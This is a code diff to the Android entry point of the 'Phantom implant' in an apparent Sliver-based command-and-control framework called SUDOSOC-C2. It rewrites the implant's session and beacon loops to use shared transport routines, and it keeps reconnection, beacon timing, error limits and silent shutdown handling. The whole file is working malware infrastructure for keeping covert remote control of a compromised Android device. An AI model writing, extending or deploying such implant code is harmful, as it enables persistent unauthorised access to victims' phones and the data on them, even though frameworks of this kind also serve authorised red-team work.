@@ -7,8 +7,9 @@ package runner
 	Copyright (C) 2026  sudosoc — Seif
 
 	Android-specific entry point for the Phantom implant.
-	Bypasses all Windows-specific imports and uses the generic
-	HTTP/HTTPS and DNS transports compatible with Android's Linux kernel.
+	runner.go's Main() is excluded for android via template guard;
+	this file provides the replacement using the same transport
+	infrastructure (StartConnectionLoop / StartBeaconLoop).
 */
 
 import (
@@ -21,25 +22,21 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/handlers"
 	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/limits"
 	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/transports"
 )
 
-// Main - Android implant entry point
+// Main - Android implant entry point (replaces runner.go Main for android).
 func Main() {
 	// {{if .Config.Debug}}
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
-	log.Printf("[android] Phantom implant starting on Android")
+	log.Printf("[android] Phantom implant starting")
 	// {{end}}
 
-	// Apply operational limits (time, domain, etc.)
 	limits.ExecLimits()
 
-	// Handle OS signals for clean shutdown
 	sigCh := make(chan os.Signal, 1)
 	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT, syscall.SIGHUP)
-
 	go func() {
 		<-sigCh
 		// {{if .Config.Debug}}
@@ -48,115 +45,74 @@ func Main() {
 		os.Exit(0)
 	}()
 
-	// Start C2 connection loop
 	// {{if .Config.IsBeacon}}
-	beaconStart()
+	androidBeaconStartup()
 	// {{else}}
-	sessionStart()
+	androidSessionStartup()
 	// {{end}}
 }
 
-// sessionStart — persistent session mode
-func sessionStart() {
+// androidSessionStartup - session mode using the shared transport loop.
+func androidSessionStartup() {
 	// {{if .Config.Debug}}
 	log.Printf("[android] starting session mode")
 	// {{end}}
-
-	for {
-		err := startC2Loop()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("[android] C2 error: %v — reconnecting in %ds", err, reconnectInterval())
-			// {{end}}
-			time.Sleep(time.Duration(reconnectInterval()) * time.Second)
+	abort := make(chan struct{})
+	defer func() { abort <- struct{}{} }()
+	connections := transports.StartConnectionLoop(abort)
+	for connection := range connections {
+		if connection != nil {
+			err := sessionMainLoop(connection)
+			if err != nil {
+				if err == ErrTerminate {
+					connection.Cleanup()
+					return
+				}
+				connectionErrors++
+				if transports.GetMaxConnectionErrors() < connectionErrors {
+					return
+				}
+			}
 		}
+		reconnect := transports.GetReconnectInterval()
+		// {{if .Config.Debug}}
+		log.Printf("[android] reconnect sleep: %s", reconnect)
+		// {{end}}
+		time.Sleep(reconnect)
 	}
 }
 
-// beaconStart — beacon check-in mode
-func beaconStart() {
+// androidBeaconStartup - beacon mode using the shared transport loop.
+func androidBeaconStartup() {
 	// {{if .Config.Debug}}
-	log.Printf("[android] starting beacon mode (interval: {{.Config.BeaconInterval}}s)")
+	log.Printf("[android] starting beacon mode")
 	// {{end}}
-
-	for {
+	abort := make(chan struct{})
+	defer func() { abort <- struct{}{} }()
+	beacons := transports.StartBeaconLoop(abort)
+	for beacon := range beacons {
 		// {{if .Config.Debug}}
-		log.Printf("[android] beacon check-in")
+		log.Printf("[android] next beacon = %v", beacon)
 		// {{end}}
-
-		err := startC2Loop()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("[android] beacon error: %v", err)
-			// {{end}}
+		if beacon != nil {
+			if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
+				continue
+			}
+			err := beaconMainLoop(beacon)
+			if err != nil {
+				connectionErrors++
+				if transports.GetMaxConnectionErrors() < connectionErrors {
+					return
+				}
+			}
 		}
-
-		// Sleep until next check-in
-		// {{if .Config.BeaconJitter}}
-		jitter := time.Duration(beaconJitter()) * time.Second
-		// {{else}}
-		jitter := time.Duration(0)
-		// {{end}}
-		sleepDur := time.Duration(beaconInterval())*time.Second + jitter
-		// {{if .Config.Debug}}
-		log.Printf("[android] sleeping for %v until next check-in", sleepDur)
-		// {{end}}
-		time.Sleep(sleepDur)
-	}
-}
-
-// startC2Loop establishes C2 connection and processes commands
-func startC2Loop() error {
-	// Get system handlers for Android
-	systemHandlers := handlers.GetSystemHandlers()
-	pivotHandlers := handlers.GetSystemPivotHandlers()
-	tunnelHandlers := handlers.GetSystemTunnelHandlers()
-
-	_ = systemHandlers
-	_ = pivotHandlers
-	_ = tunnelHandlers
-
-	// Attempt connection using configured transports
-	// Android uses HTTPS > DNS priority (mTLS less common on mobile networks)
-	c2URLs := transports.GetAvailableC2s()
-
-	for _, c2URL := range c2URLs {
-		// {{if .Config.Debug}}
-		log.Printf("[android] trying C2: %s", c2URL)
-		// {{end}}
-
-		err := connectAndLoop(c2URL, systemHandlers)
-		if err == nil {
-			return nil
+		if c2 := transports.GetC2URI(); c2 != "" && (beacon == nil || c2 != beacon.ActiveC2) {
+			continue
 		}
+		reconnect := transports.GetReconnectInterval()
 		// {{if .Config.Debug}}
-		log.Printf("[android] %s failed: %v", c2URL, err)
+		log.Printf("[android] reconnect sleep: %s", reconnect)
 		// {{end}}
+		time.Sleep(reconnect)
 	}
-
-	return fmt.Errorf("all C2 channels failed")
-}
-
-func reconnectInterval() int {
-	// {{if .Config.ReconnectInterval}}
-	return {{.Config.ReconnectInterval}}
-	// {{else}}
-	return 60
-	// {{end}}
-}
-
-func beaconInterval() int {
-	// {{if .Config.BeaconInterval}}
-	return int({{.Config.BeaconInterval}}.Seconds())
-	// {{else}}
-	return 60
-	// {{end}}
-}
-
-func beaconJitter() int {
-	// {{if .Config.BeaconJitter}}
-	return int({{.Config.BeaconJitter}}.Seconds() * 0.4)
-	// {{else}}
-	return 0
-	// {{end}}
 }
